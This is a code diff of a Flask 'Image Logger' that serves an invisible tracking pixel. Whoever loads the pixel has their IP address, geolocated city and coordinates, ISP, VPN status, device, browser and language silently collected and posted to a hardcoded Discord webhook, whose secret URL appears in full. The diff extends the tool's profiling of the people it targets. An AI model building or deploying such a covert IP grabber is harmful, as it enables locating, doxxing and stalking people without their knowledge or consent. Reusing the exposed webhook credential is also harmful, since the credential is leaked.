@@ -1,65 +1,168 @@
 from flask import Flask, request, Response
 import requests
 from datetime import datetime
+import re
 
 app = Flask(__name__)
 
-# --- HARDCODED DISCORD WEBHOOK (User Requested) ---
-# ⚠️ WARNING: This webhook is now public. Regenerate it in Discord immediately after testing.
+# --- CONFIGURATION ---
+# ⚠️ REGENERATE YOUR WEBHOOK NOW – this one is public.
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY"
 
-# --- HELPER: Get the REAL IP address (bypasses Vercel proxy) ---
+# IPs to IGNORE (so your own tests don't get logged)
+IGNORE_IPS = [
+    "127.0.0.1",      # localhost
+    "192.168.1.1",    # your local IP (change to your actual public IP if you want)
+    "YOUR_PUBLIC_IP", # replace with your real IP (find at whatismyip.com)
+]
+
+# Set to True if you want to ignore the referer header (so the link itself isn't logged)
+IGNORE_REFERER = True
+
+# --- HELPER: Get real client IP ---
 def get_client_ip():
     x_forwarded_for = request.headers.get('X-Forwarded-For')
     if x_forwarded_for:
-        ip = x_forwarded_for.split(',')[0].strip()
-    else:
-        ip = request.remote_addr
-    return ip
+        return x_forwarded_for.split(',')[0].strip()
+    return request.remote_addr
 
-# --- HELPER: Get Geolocation & VPN status via ip-api.com ---
+# --- HELPER: Check if IP should be ignored ---
+def is_ignored(ip):
+    return ip in IGNORE_IPS
+
+# --- HELPER: Get IP info from multiple APIs (more accuracy) ---
 def get_ip_info(ip):
     try:
-        response = requests.get(
-            f'http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,as,proxy,query',
+        # Try ipapi.co first (gives more fields)
+        resp = requests.get(f'https://ipapi.co/{ip}/json/', timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'error' not in data:
+                # Translate fields to our format
+                return {
+                    'country': data.get('country_name'),
+                    'regionName': data.get('region'),
+                    'city': data.get('city'),
+                    'lat': data.get('latitude'),
+                    'lon': data.get('longitude'),
+                    'isp': data.get('org'),
+                    'proxy': data.get('proxy') or data.get('vpn') or False,
+                    'timezone': data.get('timezone'),
+                }
+        # Fallback to ip-api.com if ipapi.co fails
+        resp2 = requests.get(
+            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,org,proxy,timezone',
             timeout=5
         )
-        data = response.json()
-        if data.get('status') == 'success':
-            return data
-        return None
+        if resp2.status_code == 200:
+            data2 = resp2.json()
+            if data2.get('status') == 'success':
+                return {
+                    'country': data2.get('country'),
+                    'regionName': data2.get('regionName'),
+                    'city': data2.get('city'),
+                    'lat': data2.get('lat'),
+                    'lon': data2.get('lon'),
+                    'isp': data2.get('isp'),
+                    'proxy': data2.get('proxy') or False,
+                    'timezone': data2.get('timezone'),
+                }
     except Exception:
-        return None
+        pass
+    return None
 
-# --- HELPER: Send a beautiful embed to Discord ---
-def send_discord_notification(ip_info):
+# --- HELPER: Parse User-Agent for device details ---
+def parse_user_agent(ua):
+    os = "Unknown OS"
+    browser = "Unknown Browser"
+    device = "Desktop"
+
+    # OS detection
+    if "Windows" in ua:
+        os = "Windows"
+        if "Windows NT 10.0" in ua: os = "Windows 10/11"
+        elif "Windows NT 6.1" in ua: os = "Windows 7"
+        elif "Windows NT 6.3" in ua: os = "Windows 8.1"
+    elif "Mac OS X" in ua:
+        os = "macOS"
+        if "Mac OS X 10_15" in ua: os = "macOS Catalina"
+        elif "Mac OS X 11_0" in ua: os = "macOS Big Sur"
+        elif "Mac OS X 12_0" in ua: os = "macOS Monterey"
+    elif "Linux" in ua:
+        os = "Linux"
+        if "Android" in ua:
+            os = "Android"
+            device = "Mobile"
+    elif "iPhone" in ua:
+        os = "iOS"
+        device = "Mobile"
+    elif "iPad" in ua:
+        os = "iPadOS"
+        device = "Tablet"
+
+    # Browser detection
+    if "Edg/" in ua:
+        browser = "Microsoft Edge"
+    elif "OPR/" in ua or "Opera" in ua:
+        browser = "Opera"
+    elif "Chrome/" in ua and not "Edg/" in ua and not "OPR/" in ua:
+        browser = "Google Chrome"
+    elif "Firefox/" in ua:
+        browser = "Mozilla Firefox"
+    elif "Safari/" in ua and not "Chrome/" in ua:
+        browser = "Apple Safari"
+    elif "Trident/" in ua or "MSIE" in ua:
+        browser = "Internet Explorer"
+
+    # Device type
+    if "Mobile" in ua or "Android" in ua and "Tablet" not in ua:
+        device = "Mobile"
+    elif "Tablet" in ua or "iPad" in ua:
+        device = "Tablet"
+
+    return os, browser, device
+
+# --- HELPER: Send Discord embed ---
+def send_discord_notification(ip_info, ip):
     if not DISCORD_WEBHOOK_URL:
-        print("❌ Webhook URL is empty!")
         return
 
-    user_agent = request.headers.get('User-Agent', 'Unknown')
-    referer = request.headers.get('Referer', 'Direct Access')
+    # Ignore if we don't want to log
+    if is_ignored(ip):
+        print(f"Ignored IP: {ip}")
+        return
+
+    # Parse headers
+    ua = request.headers.get('User-Agent', 'Unknown')
+    referer = request.headers.get('Referer', '')
     language = request.headers.get('Accept-Language', 'Unknown')
-    ip = get_client_ip()
 
-    # VPN Detection Logic
-    vpn_status = "🟢 OFF (No VPN/Proxy detected)"
-    embed_color = 0x00ff00  # Green
+    # Parse device info
+    os, browser, device = parse_user_agent(ua)
+
+    # VPN status
+    vpn_status = "🟢 OFF (No VPN/Proxy)"
+    embed_color = 0x00ff00
     if ip_info and ip_info.get('proxy') is True:
-        vpn_status = "🔴 ON (VPN/Proxy/Cloudflare detected)"
-        embed_color = 0xff0000  # Red
+        vpn_status = "🔴 ON (VPN/Proxy detected)"
+        embed_color = 0xff0000
 
-    # Build the location string
+    # Location
     if ip_info:
         location = f"{ip_info.get('city', 'N/A')}, {ip_info.get('regionName', 'N/A')}, {ip_info.get('country', 'N/A')}"
         isp = ip_info.get('isp', 'N/A')
         coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}"
+        timezone = ip_info.get('timezone', 'N/A')
     else:
-        location = "N/A (IP lookup failed)"
+        location = "N/A"
         isp = "N/A"
         coords = "N/A"
+        timezone = "N/A"
 
-    # Create the Discord Embed
+    # Referrer (optional)
+    if IGNORE_REFERER:
+        referer = "🔒 Hidden (by config)"
+
     embed = {
         "title": "🎯 Invisible Pixel Logged!",
         "color": embed_color,
@@ -67,44 +170,47 @@ def send_discord_notification(ip_info):
         "fields": [
             {"name": "🌍 IP Address", "value": f"`{ip}`", "inline": True},
             {"name": "🛡️ VPN / Proxy", "value": vpn_status, "inline": True},
-            {"name": "📍 Approximate Location", "value": location, "inline": False},
+            {"name": "📍 Location", "value": location, "inline": False},
             {"name": "🗺️ Coordinates", "value": f"`{coords}`", "inline": True},
-            {"name": "📡 ISP / Organization", "value": isp, "inline": True},
-            {"name": "💻 Device & Browser", "value": user_agent[:80] + ("..." if len(user_agent) > 80 else ""), "inline": False},
-            {"name": "🔗 Referrer (Where they clicked)", "value": referer if referer else "Direct", "inline": True},
-            {"name": "🌐 Language", "value": language, "inline": True},
-            {"name": "🕒 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False}
+            {"name": "📡 ISP", "value": isp, "inline": True},
+            {"name": "🕒 Timezone", "value": timezone, "inline": True},
+            {"name": "💻 Device", "value": device, "inline": True},
+            {"name": "🖥️ OS", "value": os, "inline": True},
+            {"name": "🌐 Browser", "value": browser, "inline": True},
+            {"name": "🌎 Language", "value": language, "inline": True},
+            {"name": "🔗 Referrer", "value": referer if referer else "Direct", "inline": False},
+            {"name": "📅 Timestamp", "value": f"<t:{int(datetime.utcnow().timestamp())}:F>", "inline": False}
         ],
-        "footer": {"text": "Python Image Logger · Vercel"},
+        "footer": {"text": "Python Image Logger · Enhanced"},
         "timestamp": datetime.utcnow().isoformat()
     }
 
     payload = {"embeds": [embed]}
-
     try:
         resp = requests.post(DISCORD_WEBHOOK_URL, json=payload)
         if resp.status_code != 204:
-            print(f"Discord error: {resp.status_code} - {resp.text}")
+            print(f"Discord error: {resp.status_code}")
     except Exception as e:
-        print(f"Failed to send to Discord: {e}")
+        print(f"Send error: {e}")
 
-# --- ROUTE 1: Homepage (just to confirm it's alive) ---
+# --- ROUTES ---
 @app.route('/')
 def home():
-    return "Image Logger is active. The tracking pixel is at /pixel.png"
+    return "Image Logger is active. /pixel.png is the tracker."
 
-# --- ROUTE 2: The Magic Tracking Pixel ---
 @app.route('/pixel.png')
 def pixel():
-    # 1. Get IP and Geolocation
     ip = get_client_ip()
-    ip_info = get_ip_info(ip)
 
-    # 2. Send notification to Discord
-    send_discord_notification(ip_info)
+    # If IP is ignored, just return pixel without logging
+    if is_ignored(ip):
+        print(f"Ignored IP: {ip} (no log)")
+    else:
+        ip_info = get_ip_info(ip)
+        send_discord_notification(ip_info, ip)
 
-    # 3. Return a 1x1 transparent GIF (Invisible to the user)
-    transparent_gif = bytes([
+    # Return the 1x1 transparent GIF
+    gif = bytes([
         0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00,
         0x01, 0x00, 0x80, 0x00, 0x00, 0xFF, 0xFF, 0xFF,
         0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00,
@@ -112,8 +218,7 @@ def pixel():
         0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x01, 0x00,
         0x00
     ])
-    return Response(transparent_gif, mimetype='image/gif')
+    return Response(gif, mimetype='image/gif')
 
-# --- For local testing (not used by Vercel) ---
 if __name__ == '__main__':
     app.run(debug=True)
